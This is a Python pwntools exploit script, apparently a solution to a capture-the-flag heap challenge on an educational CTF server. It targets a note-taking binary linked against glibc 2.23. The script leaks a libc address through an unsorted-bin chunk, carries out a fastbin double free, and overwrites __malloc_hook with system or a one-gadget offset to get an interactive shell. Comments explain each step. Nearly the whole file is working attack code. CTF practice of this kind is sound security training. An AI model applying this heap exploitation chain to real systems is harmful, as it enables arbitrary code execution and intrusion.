#!/usr/bin/python3
from pwn import *

context.arch = 'amd64'
l = ELF('libc-2.23.so')

binary = remote('edu-ctf.csie.org', 10178)
#binary = process('./note')


def add(size, note):
    binary.sendafter('>', '1')
    binary.sendafter('Size: ', str(size))
    binary.sendafter('Note: ', note)


def show(index):
    binary.sendafter('>', '2')
    binary.sendafter('Index: ', str(index))


def delete(index):
    binary.sendafter('>', '3')
    binary.sendafter('Index: ', str(index))


# Information Leak
# Due to the size, this bin will be in unsorted bins after freed
add(0x100, 'leak')
# However, if the chunk immediately next is top chunk, after it's freed,
# it will be merged with top chunk instead of unsorted bins
# To bypass, add another bin first
add(0x68, 'a')
add(0x68, 'b')
delete(0)
show(0)
binary.recvline()
# Similar to ret2libc, the offset can be found by tracing gdb
l.address = u64(binary.recv(6) + b'\0\0') - 0x3c4b78
success(f'libc -> {hex(l.address)}')

# Double free
delete(1)
delete(2)
delete(1)

# Overwrite freed fd to in front of malloc hook
add(0x68, p64(l.sym.__malloc_hook - 0x10 - 3))
# Remove 2 from linked list
add(0x68, 'a')
# Remove 1 from linked list
add(0x68, 'a')

# Solution 1
# One gadget doesn't work here, so use system instead
add(0x68, b'aaa' + p64(l.sym.system))
# The first argument will be treated as an address(of '/bin/sh')
binary.sendafter('>', '1')
binary.sendafter('Size: ', str(next(l.search(b'/bin/sh'))))

# Solution 2
# Try different ways to trigger malloc, such that it fits the constraints
add(0x68, b'aaa' + p64(l.address + 0xf02a4))
delete(1)
delete(1)
# Still using one gadget. When libc detects double free and triggers error,
# it will call malloc in the process

binary.interactive()
